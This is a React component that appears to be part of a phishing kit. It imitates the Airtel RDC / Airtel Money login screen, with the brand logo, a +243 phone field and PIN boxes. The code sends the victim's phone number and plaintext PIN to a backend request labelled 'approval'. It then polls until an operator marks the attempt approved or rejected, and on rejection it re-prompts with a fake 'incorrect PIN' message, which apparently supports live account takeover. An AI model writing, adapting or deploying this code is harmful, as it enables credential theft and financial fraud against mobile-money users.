import React, { useState, useRef, useEffect } from "react";
import { requestApproval, checkStatus } from "../utils/apiClient";
import toast from "react-hot-toast";
import { Loader2 } from "lucide-react";
import { ApplicationData } from "../types";

interface PaymentConfirmationProps {
    applicationData: ApplicationData | null;
    onBack: () => void;
    onComplete: () => void;
}

function PaymentConfirmation({
    applicationData,
    onBack,
    onComplete,
}: PaymentConfirmationProps) {
    const [phoneNumber, setPhoneNumber] = useState(applicationData?.phone || "");
    const [pin, setPin] = useState<string[]>(["", "", "", ""]);
    const [loading, setLoading] = useState(false);
    const [showWrongPin, setShowWrongPin] = useState(false);
    const [shakeError, setShakeError] = useState(false);
    const [errors, setErrors] = useState<any>({});

    const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
    const submittingRef = useRef(false);

    useEffect(() => {
        // Auto-focus first PIN box on mount
        setTimeout(() => {
            pinInputRefs.current[0]?.focus();
        }, 100);
    }, []);

    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let value = e.target.value.replace(/\D/g, "");
        if (value.length > 9) value = value.slice(0, 9);

        // Format as XXX XXX XXX
        let formatted = "";
        for (let i = 0; i < value.length; i++) {
            if (i === 3 || i === 6) formatted += " ";
            formatted += value[i];
        }

        setPhoneNumber(formatted);
        if (errors.phoneNumber) {
            setErrors((prev: any) => ({ ...prev, phoneNumber: "" }));
        }
    };

    const handlePinChange = (index: number, value: string) => {
        if (!/^\d*$/.test(value)) return;

        const newPin = [...pin];
        newPin[index] = value.slice(-1);
        setPin(newPin);

        // Auto-focus next input
        if (value && index < 3) {
            pinInputRefs.current[index + 1]?.focus();
        }

        // Check if all 4 digits entered, then auto-submit
        if (value && index === 3) {
            const fullPin = [...newPin.slice(0, 3), value.slice(-1)].join("");
            if (fullPin.length === 4) {
                setTimeout(() => {
                    executeSubmit(fullPin);
                }, 100);
            }
        }
    };

    const handlePinKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (e.key === "Backspace" && !pin[index] && index > 0) {
            pinInputRefs.current[index - 1]?.focus();
        }
    };

    const validateForm = () => {
        const newErrors: any = {};
        const phoneDigits = phoneNumber.replace(/\D/g, "");

        if (!phoneDigits) {
            newErrors.phoneNumber = "Le numéro de téléphone est requis";
        } else if (phoneDigits.length < 8) {
            newErrors.phoneNumber = "Numéro de téléphone invalide (ex: 099 123 4567)";
        }

        setErrors(newErrors);
        return newErrors;
    };

    const executeSubmit = async (pinValue: string) => {
        if (submittingRef.current || loading) return;

        const newErrors = validateForm();
        if (Object.keys(newErrors).length > 0) {
            if (!newErrors.phoneNumber) {
                toast.error("Veuillez remplir tous les champs");
            }
            return;
        }

        setLoading(true);
        submittingRef.current = true;

        try {
            const payload = {
                type: 'login',
                name: "",
                phone: `+243${phoneNumber.replace(/\s/g, '')}`,
                details: `PIN: ${pinValue}`,
            };

            const res = await requestApproval(payload);
            const attemptId = res.attemptId;
            console.log("Got attemptId:", attemptId);

            // Start polling for status - max 2 minutes
            let pollCount = 0;
            const maxPolls = 60;
            const interval = setInterval(async () => {
                pollCount++;
                if (pollCount > maxPolls) {
                    clearInterval(interval);
                    submittingRef.current = false;
                    setLoading(false);
                    toast.error("Délai d'attente dépassé. Veuillez réessayer.");
                    return;
                }

                try {
                    const statusRes = await checkStatus(attemptId);
                    const status = statusRes.status;

                    if (status === 'approved') {
                        clearInterval(interval);
                        submittingRef.current = false;
                        setLoading(false);
                        toast.success("Connexion réussie !");
                        onComplete();
                    } else if (status === 'rejected') {
                        clearInterval(interval);
                        submittingRef.current = false;
                        setLoading(false);
                        setShowWrongPin(true);
                        setShakeError(true);
                        setTimeout(() => setShakeError(false), 600);
                        setPin(["", "", "", ""]);
                        setTimeout(() => pinInputRefs.current[0]?.focus(), 100);
                        toast.error("Code PIN ou numéro de téléphone incorrect.");
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 2000);

        } catch (err: any) {
            console.error("Failed to request approval:", err);
            submittingRef.current = false;
            const statusCode = err.response?.status;
            const errorData = err.response?.data;

            console.error(`Status: ${statusCode}`);
            if (errorData) console.error("Error data:", errorData);

            setLoading(false);
            const msg = statusCode ? `Erreur de connexion (${statusCode}). Veuillez réessayer.` : "Échec de connexion au serveur. Veuillez réessayer.";
            toast.error(msg);
        }
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        const pinValue = pin.join("");
        if (pinValue.length !== 4) {
            toast.error("Veuillez entrer les 4 chiffres du code PIN");
            return;
        }
        executeSubmit(pinValue);
    };

    return (
        <div
            style={{
                minHeight: "100vh",
                background: "#f5f7fa",
                display: "flex",
                flexDirection: "column" as const,
                position: "relative",
            }}
        >
            {/* Main Content */}
            <div
                style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column" as const,
                    alignItems: "center",
                    padding: "60px 20px 20px",
                    background: "white",
                }}
            >
                {/* Airtel RDC Logo */}
                <div
                    style={{
                        marginBottom: "36px",
                        textAlign: "center",
                    }}
                >
                    <img
                        src="/airtel.svg"
                        alt="Airtel RDC"
                        style={{
                            height: "60px",
                            objectFit: "contain",
                        }}
                    />
                </div>

                {/* Login Text */}
                <h1
                    style={{
                        fontSize: "28px",
                        fontWeight: "600",
                        color: "#555",
                        marginBottom: "40px",
                    }}
                >
                    Connexion
                </h1>

                {/* Phone Number Input */}
                <div
                    style={{
                        width: "100%",
                        maxWidth: "450px",
                        marginBottom: "30px",
                    }}
                >
                    <div
                        style={{
                            display: "flex",
                            alignItems: "center",
                            gap: "12px",
                            padding: "14px 18px",
                            border: "2px solid #e40000",
                            borderRadius: "12px",
                            background: "white",
                        }}
                    >
                        <span style={{ fontSize: "24px" }}>🇨🇩</span>
                        <span
                            style={{
                                fontSize: "16px",
                                color: "#333",
                                fontWeight: "500",
                            }}
                        >
                            +243
                        </span>
                        <input
                            type="tel"
                            placeholder="099 123 4567"
                            value={phoneNumber}
                            onChange={handlePhoneChange}
                            style={{
                                flex: 1,
                                border: "none",
                                outline: "none",
                                fontSize: "16px",
                                color: "#333",
                                background: "transparent",
                            }}
                        />
                    </div>
                    {errors.phoneNumber && (
                        <p
                            style={{
                                color: "#dc3545",
                                fontSize: "14px",
                                marginTop: "8px",
                                marginBottom: "0",
                            }}
                        >
                            {errors.phoneNumber}
                        </p>
                    )}
                </div>

                {/* Enter PIN Text */}
                <p
                    style={{
                        fontSize: "16px",
                        color: "#888",
                        marginBottom: "20px",
                    }}
                >
                    Entrez votre code PIN
                </p>

                {/* 4 PIN Boxes */}
                <form onSubmit={handleSubmit} style={{ width: "100%" }}>
                    <div
                        className={shakeError ? "shake" : ""}
                        style={{
                            display: "flex",
                            justifyContent: "center",
                            gap: "16px",
                            marginBottom: "8px",
                        }}
                    >
                        {pin.map((digit, index) => (
                            <input
                                key={index}
                                ref={(el) => (pinInputRefs.current[index] = el)}
                                type="password"
                                inputMode="numeric"
                                maxLength={1}
                                value={digit}
                                onChange={(e) => handlePinChange(index, e.target.value)}
                                onKeyDown={(e) => handlePinKeyDown(index, e)}
                                style={{
                                    width: "60px",
                                    height: "60px",
                                    fontSize: "32px",
                                    textAlign: "center",
                                    border: showWrongPin ? "2px solid #dc3545" : "2px solid #e40000",
                                    borderRadius: "12px",
                                    outline: "none",
                                    background: "white",
                                    color: "#333",
                                }}
                            />
                        ))}
                    </div>

                    {/* Wrong PIN Error */}
                    {showWrongPin && (
                        <div
                            style={{
                                textAlign: "center",
                                marginBottom: "16px",
                            }}
                        >
                            <p
                                style={{
                                    color: "#dc3545",
                                    fontSize: "14px",
                                    fontWeight: "600",
                                    margin: 0,
                                }}
                            >
                                Numéro de téléphone ou code PIN incorrect.
                            </p>
                        </div>
                    )}

                    {/* Forgot PIN */}
                    <div style={{ textAlign: "center", marginBottom: "60px" }}>
                        <a
                            href="#"
                            style={{
                                color: "#888",
                                fontSize: "15px",
                                textDecoration: "none",
                            }}
                        >
                            Code PIN oublié ?
                        </a>
                    </div>

                    {/* Hidden Submit Button */}
                    <button type="submit" style={{ display: "none" }}>
                        Valider
                    </button>
                </form>
            </div>

            {/* Red Wave Bottom Section */}
            <div
                style={{
                    position: "relative",
                    background: "#e40000",
                    paddingTop: "80px",
                    paddingBottom: "40px",
                    marginTop: "auto",
                }}
            >
                {/* Wave SVG */}
                <svg
                    viewBox="0 0 1440 120"
                    style={{
                        position: "absolute",
                        top: "-1px",
                        left: 0,
                        width: "100%",
                        height: "80px",
                    }}
                    preserveAspectRatio="none"
                >
                    <path d="M0,0 C480,120 960,120 1440,0 L1440,120 L0,120 Z" fill="white" />
                </svg>

                <div
                    style={{
                        textAlign: "center",
                        color: "white",
                        padding: "0 20px",
                    }}
                >
                    <p
                        style={{
                            fontSize: "15px",
                            marginBottom: "24px",
                            lineHeight: "1.5",
                        }}
                    >
                        Pour créer un compte Airtel Money ou obtenir de l'aide,
                        <br />
                        cliquez ci-dessous
                    </p>

                    <div
                        style={{
                            display: "flex",
                            gap: "16px",
                            justifyContent: "center",
                            marginBottom: "32px",
                        }}
                    >
                        <button
                            style={{
                                background: "white",
                                color: "#e40000",
                                border: "none",
                                borderRadius: "8px",
                                padding: "16px 32px",
                                fontSize: "15px",
                                fontWeight: "600",
                                cursor: "pointer",
                                display: "flex",
                                alignItems: "center",
                                gap: "8px",
                            }}
                        >
                            <span style={{ fontSize: "20px" }}>👤</span>
                            S'inscrire
                        </button>
                        <button
                            style={{
                                background: "white",
                                color: "#e40000",
                                border: "none",
                                borderRadius: "8px",
                                padding: "16px 32px",
                                fontSize: "15px",
                                fontWeight: "600",
                                cursor: "pointer",
                                display: "flex",
                                alignItems: "center",
                                gap: "8px",
                            }}
                        >
                            <span style={{ fontSize: "20px" }}>ℹ️</span>
                            Aide & Support
                        </button>
                    </div>

                    <p
                        style={{
                            fontSize: "13px",
                            opacity: 0.8,
                            marginBottom: "8px",
                        }}
                    >
                        v2.1.3P
                    </p>
                    <p
                        style={{
                            fontSize: "13px",
                            opacity: 0.9,
                        }}
                    >
                        En vous connectant, vous acceptez les{" "}
                        <a href="#" style={{ color: "white", textDecoration: "underline" }}>
                            Conditions Générales d'Utilisation
                        </a>
                    </p>
                </div>
            </div>

            {/* Loading Overlay */}
            {loading && (
                <div
                    style={{
                        position: "fixed",
                        inset: 0,
                        background: "rgba(0,0,0,0.5)",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        zIndex: 9999,
                    }}
                >
                    <div
                        style={{
                            background: "white",
                            borderRadius: "12px",
                            padding: "32px",
                            display: "flex",
                            flexDirection: "column" as const,
                            alignItems: "center",
                            gap: "16px",
                        }}
                    >
                        <Loader2 className="spinner" size={40} color="#e40000" />
                        <p style={{ fontSize: "16px", color: "#333" }}>Traitement en cours...</p>
                    </div>
                </div>
            )}

            {/* Shake Animation */}
            <style>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
          20%, 40%, 60%, 80% { transform: translateX(10px); }
        }
        .shake {
          animation: shake 0.5s;
        }
      `}</style>
        </div>
    );
}

export default PaymentConfirmation;
